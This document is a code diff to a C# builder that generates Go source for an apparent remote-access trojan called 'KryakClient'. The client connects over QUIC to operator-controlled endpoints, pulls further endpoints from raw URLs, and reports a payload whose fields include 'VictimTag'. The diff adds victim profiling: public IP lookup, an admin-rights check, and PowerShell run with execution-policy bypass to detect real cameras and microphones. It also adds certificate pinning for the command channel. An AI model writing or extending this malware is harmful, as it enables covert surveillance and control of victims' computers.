@@ -29,10 +29,13 @@ golang.org/x/tools v0.22.0 h1:gqSGLZqv+AI9lIQzniJ0nZDRG5GBPsSi+DRNHWNz6yA=
 golang.org/x/tools v0.22.0/go.mod h1:aCwcsjqvq7Yqt6TNyX7QMU2enbQ/Gt0bo6krSeEri+c=";
         }
 
-        public static string GetClientCode(string[] ipList, string[] rawList)
+        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint)
         {
             string ipAddresses = string.Join(", ", Array.ConvertAll(ipList, ip => $"\"{EscapeGoString(ip)}\""));
             string raws = string.Join(", ", Array.ConvertAll(rawList, raw => $"\"{EscapeGoString(raw)}\""));
+            string tag = EscapeGoString(string.IsNullOrWhiteSpace(clientTag) ? "KryakClient" : clientTag.Trim());
+            string mode = EscapeGoString(string.IsNullOrWhiteSpace(securityMode) ? "insecure" : securityMode.Trim().ToLowerInvariant());
+            string pinned = EscapeGoString(NormalizeFingerprint(pinnedFingerprint));
 
             string src = $@"
 package main
@@ -40,14 +43,19 @@ package main
 import (
     ""bufio""
     ""context""
+    ""crypto/sha1""
     ""crypto/tls""
+    ""crypto/x509""
     ""encoding/binary""
+    ""encoding/hex""
     ""encoding/json""
     ""errors""
     ""fmt""
     ""io""
+    ""net""
     ""net/http""
     ""os""
+    ""os/exec""
     ""os/signal""
     ""strings""
     ""sync""
@@ -67,6 +75,9 @@ const (
     typePong = ""pong""
     typeCommand = ""command""
 )
+
+const securityMode = ""{mode}""
+const pinnedFingerprint = ""{pinned}""
 
 type UserPayload struct {{
     UserIPAddress    string `json:""UserIPAddress""`
@@ -108,7 +119,7 @@ func newEndpointManager() *endpointManager {{
     return &endpointManager{{started: map[string]struct{{}}{{}}}}
 }}
 
-func (m *endpointManager) StartIfNew(ctx context.Context, endpoint string) {{
+func (m *endpointManager) StartIfNew(ctx context.Context, endpoint string, onConnectFail func()) {{
     endpoint = strings.TrimSpace(endpoint)
     if endpoint == """" {{
         return
@@ -123,7 +134,57 @@ func (m *endpointManager) StartIfNew(ctx context.Context, endpoint string) {{
     m.started[endpoint] = struct{{}}{{}}
     m.mu.Unlock()
 
-    go runEndpointLoop(ctx, endpoint)
+    go runEndpointLoop(ctx, endpoint, onConnectFail)
+}}
+
+func GetUserIp() string {{
+	resp, err := http.Get(""https://api.ipify.org?format=text"")
+	if err != nil {{
+		return ""Unknown""
+	}}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {{
+		return ""Unknown""
+	}}
+
+	ip := """"
+	_, err = fmt.Fscanf(resp.Body, ""%s"", &ip)
+	if err != nil {{
+		return ""Unknown""
+	}}
+
+	return ip
+}}
+
+func getAdminStatus() bool {{
+	cmd := exec.Command(""net"", ""session"")
+	err := cmd.Run()
+	return err == nil
+}}
+
+func getCameraStatus() bool {{
+    script := ""$virtual = @('virtual','obs','ndi','manycam','droidcam','screen capture'); "" +
+        ""$devices = Get-PnpDevice -Class Camera -Status OK -ErrorAction SilentlyContinue; "" +
+        ""if (-not $devices) {{ $devices = Get-PnpDevice -Class Image -Status OK -ErrorAction SilentlyContinue }}; "" +
+        ""if (-not $devices) {{ exit 1 }}; "" +
+        ""$real = $devices | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
+        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""
+
+    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
+    return cmd.Run() == nil
+}}
+
+func getMicrophoneStatus() bool {{
+    script := ""$virtual = @('virtual','obs','ndi','manycam','voicemeeter','cable','loopback','stereo mix'); "" +
+        ""$devices = Get-PnpDevice -Class AudioEndpoint -Status OK -ErrorAction SilentlyContinue; "" +
+        ""if (-not $devices) {{ exit 1 }}; "" +
+        ""$mics = $devices | Where-Object {{ $_.FriendlyName -match 'microphone|mic|array' -or $_.Class -eq 'AudioEndpoint' }}; "" +
+        ""$real = $mics | Where-Object {{ $name = ($_.FriendlyName + ' ' + $_.InstanceId).ToLower(); -not ($virtual | Where-Object {{ $name.Contains($_) }}) }}; "" +
+        ""if ($real -and $real.Count -gt 0) {{ exit 0 }} else {{ exit 1 }}""
+
+    cmd := exec.Command(""powershell"", ""-NoProfile"", ""-NonInteractive"", ""-ExecutionPolicy"", ""Bypass"", ""-Command"", script)
+    return cmd.Run() == nil
 }}
 
 func main() {{
@@ -136,7 +197,7 @@ func main() {{
     manager := newEndpointManager()
 
     for _, endpoint := range ipList {{
-        manager.StartIfNew(ctx, endpoint)
+        manager.StartIfNew(ctx, endpoint, nil)
     }}
 
     for _, rawURL := range rawList {{
@@ -154,6 +215,14 @@ func main() {{
 func runRawLoop(ctx context.Context, rawURL string, manager *endpointManager) {{
     ticker := time.NewTicker(30 * time.Second)
     defer ticker.Stop()
+    refreshCh := make(chan struct{{}}, 1)
+
+    signalRefresh := func() {{
+        select {{
+        case refreshCh <- struct{{}}{{}}:
+        default:
+        }}
+    }}
 
     fetch := func() {{
         endpoints, err := fetchRawEndpoints(ctx, rawURL)
@@ -162,7 +231,7 @@ func runRawLoop(ctx context.Context, rawURL string, manager *endpointManager) {{
         }}
 
         for _, endpoint := range endpoints {{
-            manager.StartIfNew(ctx, endpoint)
+            manager.StartIfNew(ctx, endpoint, signalRefresh)
         }}
     }}
 
@@ -171,6 +240,8 @@ func runRawLoop(ctx context.Context, rawURL string, manager *endpointManager) {{
         select {{
         case <-ctx.Done():
             return
+        case <-refreshCh:
+            fetch()
         case <-ticker.C:
             fetch()
         }}
@@ -211,7 +282,7 @@ func fetchRawEndpoints(ctx context.Context, rawURL string) ([]string, error) {{
     return endpoints, nil
 }}
 
-func runEndpointLoop(ctx context.Context, endpoint string) {{
+func runEndpointLoop(ctx context.Context, endpoint string, onConnectFail func()) {{
     for {{
         select {{
         case <-ctx.Done():
@@ -220,6 +291,10 @@ func runEndpointLoop(ctx context.Context, endpoint string) {{
         }}
 
         if err := connectAndServe(ctx, endpoint); err != nil {{
+            if onConnectFail != nil {{
+                onConnectFail()
+            }}
+
             select {{
             case <-ctx.Done():
                 return
@@ -237,11 +312,43 @@ func runEndpointLoop(ctx context.Context, endpoint string) {{
 }}
 
 func connectAndServe(ctx context.Context, endpoint string) error {{
+    host := endpointHost(endpoint)
+
     tlsConfig := &tls.Config{{
-        InsecureSkipVerify: true,
         NextProtos:         []string{{""kryak""}},
         MinVersion:         tls.VersionTLS13,
-        ServerName:         ""localhost"",
+        ServerName:         host,
+    }}
+
+    switch securityMode {{
+    case ""insecure"":
+        tlsConfig.InsecureSkipVerify = true
+    case ""pinned"":
+        tlsConfig.InsecureSkipVerify = true
+        tlsConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {{
+            if len(rawCerts) == 0 {{
+                return errors.New(""no server certificate"")
+            }}
+
+            cert, err := x509.ParseCertificate(rawCerts[0])
+            if err != nil {{
+                return err
+            }}
+
+            sum := sha1.Sum(cert.Raw)
+            got := strings.ToUpper(hex.EncodeToString(sum[:]))
+            expected := strings.ToUpper(strings.ReplaceAll(pinnedFingerprint, "":"", """"))
+            if expected == """" {{
+                return errors.New(""empty pinned fingerprint"")
+            }}
+
+            if got != expected {{
+                return fmt.Errorf(""pinned fingerprint mismatch"")
+            }}
+
+            return nil
+        }}
+    default:
     }}
 
     conn, err := quic.DialAddr(ctx, endpoint, tlsConfig, nil)
@@ -257,14 +364,14 @@ func connectAndServe(ctx context.Context, endpoint string) error {{
 
     writer := &streamWriter{{stream: mainStream}}
     user := UserPayload{{
-        UserIPAddress:    """",
-        VictimTag:        ""KryakClient"",
+        UserIPAddress:    GetUserIp(),
+        VictimTag:        ""{tag}"",
         Username:         usernameOrDefault(),
         Country:          ""Unknown"",
         UserOS:           runtimeName(),
-        AdminStatus:      false,
-        CameraStatus:     false,
-        MicrophoneStatus: false,
+        AdminStatus:      getAdminStatus(),
+        CameraStatus:     getCameraStatus(),
+        MicrophoneStatus: getMicrophoneStatus(),
         Ping:             ""0"",
     }}
 
@@ -370,6 +477,15 @@ func usernameOrDefault() string {{
 func runtimeName() string {{
     return ""windows""
 }}
+
+func endpointHost(endpoint string) string {{
+    host, _, err := net.SplitHostPort(endpoint)
+    if err != nil || strings.TrimSpace(host) == """" {{
+        return ""localhost""
+    }}
+
+    return host
+}}
 ";
             return src;
         }
@@ -377,6 +493,16 @@ func runtimeName() string {{
         private static string EscapeGoString(string value)
         {
             return value.Replace("\\", "\\\\").Replace("\"", "\\\"");
+        }
+
+        private static string NormalizeFingerprint(string value)
+        {
+            if (string.IsNullOrWhiteSpace(value))
+            {
+                return string.Empty;
+            }
+
+            return value.Replace(":", string.Empty).Replace(" ", string.Empty).Trim();
         }
     }
 }
